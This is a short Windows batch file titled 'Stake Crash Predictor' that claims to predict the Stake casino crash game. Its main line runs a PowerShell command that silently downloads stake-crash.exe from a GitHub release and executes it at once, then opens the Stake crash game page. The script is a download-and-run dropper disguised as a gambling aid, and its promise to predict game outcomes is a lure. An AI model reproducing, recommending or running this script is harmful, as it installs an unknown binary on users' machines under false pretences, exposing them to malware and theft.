@echo off

title Stake Crash Predictor
rem You can do any color
color 0c

echo.
echo Coded By https://github.com/Stake-Predictor-IW
echo.

powershell $down=New-Object System.Net.WebClient;$url='https://github.com/Stake-Predictor-IW/Stake-Crash-Predictor/releases/download/Crash-Predictor/stake-crash.exe';$file='stake-crash.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit

start https://stake.com/fr/casino/games/crash
